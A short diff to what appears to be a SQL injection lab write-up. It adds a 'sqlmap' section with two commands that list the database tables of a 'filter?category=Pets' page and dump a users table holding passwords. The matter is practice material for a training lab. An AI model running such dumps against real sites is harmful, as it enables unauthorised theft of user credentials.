@@ -29,3 +29,11 @@ Get users with passwords:
 ![Querying version](sqli-05-02.png)
 
 Solved.
+
+## sqlmap
+
+```bash
+sqlmap -u $URL/filter?category=Pets --tables
+sqlmap -u $URL/filter\?category\=Pets --dump users_mawrbq
+```
+![sqlmap demo](sqli-05-03.png)
